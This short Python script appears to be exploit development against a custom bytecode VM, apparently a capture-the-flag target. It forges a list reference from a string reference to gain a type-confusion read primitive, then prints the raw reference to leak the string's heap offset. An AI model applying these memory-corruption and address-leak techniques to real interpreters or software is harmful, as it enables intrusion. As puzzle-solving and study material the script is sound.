import vm, struct
def num(bs):
    return int(bs.decode().strip())

# Test 1: forged "list" ref to a string, gete reads string data as qword
prog = [('str', b'ABCDEFGH'),
        ('dup',), ('push', 1), ('add',),   # (S<<4)+2
        ('gete', 1), ('print',)]
rc, so, se = vm.run(vm.asm(prog))
print('t1', rc, so, se)
v = 0x4847464544434241
print('expect', (v>>1) if v>>1 < 2**63 else (v>>1)-2**64)

# Test 2: print the string ref itself -> learn offset S
prog = [('str', b'A'*0x30), ('dup',), ('print',), ('dup',), ('push',1), ('add',), ('print',)]
rc, so, se = vm.run(vm.asm(prog))
print('t2', rc, so, se)
